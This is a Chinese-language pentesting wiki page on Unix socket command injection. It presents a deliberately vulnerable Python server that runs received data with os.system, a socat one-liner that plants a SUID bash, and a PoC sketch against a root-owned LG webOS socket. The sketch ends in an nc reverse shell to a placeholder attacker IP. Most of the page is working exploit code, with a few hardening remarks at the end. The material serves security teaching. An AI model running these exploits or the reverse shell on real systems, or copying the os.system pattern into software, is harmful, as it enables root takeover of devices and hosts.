# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## 使用 Python 的 Socket 绑定示例

在以下示例中，创建了一个 **unix socket**（`/tmp/socket_test.s`），所有**接收**到的内容都将由 `os.system` **执行**。我知道你不会在实际环境中找到这样的代码，但此示例的目的是展示使用 unix sockets 的代码是什么样的，以及如何在最糟糕的情况下处理输入。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**使用** `python s.py` **执行**代码，并**检查 socket 的监听方式**：
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)

某些特权 daemon 会暴露由 root 拥有的 UNIX socket，该 socket 接受不可信输入，并将特权操作与 thread-ID 和 signals 关联起来。如果协议允许非特权 client 影响目标 native thread，则可能触发特权 code path 并实现提权。

观察到的模式：
- 连接由 root 拥有的 socket（例如 /tmp/remotelogger）。
- 创建一个 thread 并获取其 native thread id（TID）。
- 将 TID（packed）及 padding 作为 request 发送，并接收 acknowledgement。
- 向该 TID 发送特定 signal，以触发特权行为。

最小 PoC 草图：
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
要将其转换为 root shell，可以使用一个简单的 named-pipe + nc 模式：
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
备注：
- 此类漏洞源于信任从非特权客户端状态（TIDs）派生的值，并将其绑定到特权 signal handlers 或逻辑。
- 通过在 socket 上强制执行凭据验证、验证消息格式，以及将特权操作与外部提供的 thread identifiers 解耦来加强安全性。

## 参考资料

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
